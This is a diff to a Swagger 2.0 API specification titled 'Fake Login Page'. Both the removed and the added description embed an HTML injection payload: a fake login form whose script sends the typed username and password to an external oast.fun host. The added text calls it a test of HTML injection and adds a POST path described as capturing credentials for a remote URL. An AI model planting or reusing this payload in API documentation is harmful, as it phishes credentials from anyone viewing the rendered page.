@@ -2,34 +2,53 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Fake Login Page
-  description: '<div class="login-form">
-    <div class="heading">
-        <h1>HTML Injection : Fake Login by @cryptographer</h1>
-    </div>
-    <div>
-  <label for="username">Username</label> 
-  <input size="20" name="username" id="username" type="text"> 
-</div> 
-<div> 
-  <label for="password">Password</label> 
-  <input size="20" name="password" id="password" type="password"> 
-</div> 
-<div> 
-  <button type="submit" onclick="submitForm()">Login</button> 
-</div>
+  description: |
+    This API simulates a fake login page for testing HTML injection.
 
-<script>
-  function submitForm() {
-    var username = document.getElementById('username').value;
-    var password = document.getElementById('password').value;
-    var url = 'https://daxdflhquoshqewipjau6uqrzm07x9l3m.oast.fun/?credentials?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
-    window.location.href = url;
-  }
-</script>
-</div>'
+    When a user enters a username and password, the form will send a GET request to the following endpoint:
+    `https://daxdflhquoshqewipjau6uqrzm07x9l3m.oast.fun/?credentials?username=&password=`
+
+    ## Example HTML:
+    <div class="login-form">
+      <div class="heading">
+        <h1>HTML Injection : Fake Login by @cryptographer</h1>
+      </div>
+      <div>
+        <label for="username">Username</label> 
+        <input size="20" name="username" id="username" type="text"> 
+      </div> 
+      <div> 
+        <label for="password">Password</label> 
+        <input size="20" name="password" id="password" type="password"> 
+      </div> 
+      <div> 
+        <button type="submit" onclick="submitForm()">Login</button> 
+      </div>
+
+      <script>
+        function submitForm() {
+          var username = document.getElementById('username').value;
+          var password = document.getElementById('password').value;
+          var url = 'https://daxdflhquoshqewipjau6uqrzm07x9l3m.oast.fun/?credentials?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
+          window.location.href = url;
+        }
+      </script>
+    </div>
+
 paths:
   /:
     post:
+      summary: Simulate login
+      description: Simulate a login by capturing username and password and sending it to a remote URL for testing.
+      parameters:
+        - name: username
+          in: formData
+          required: true
+          type: string
+        - name: password
+          in: formData
+          required: true
+          type: string
       responses:
         '200':
           description: Login successful
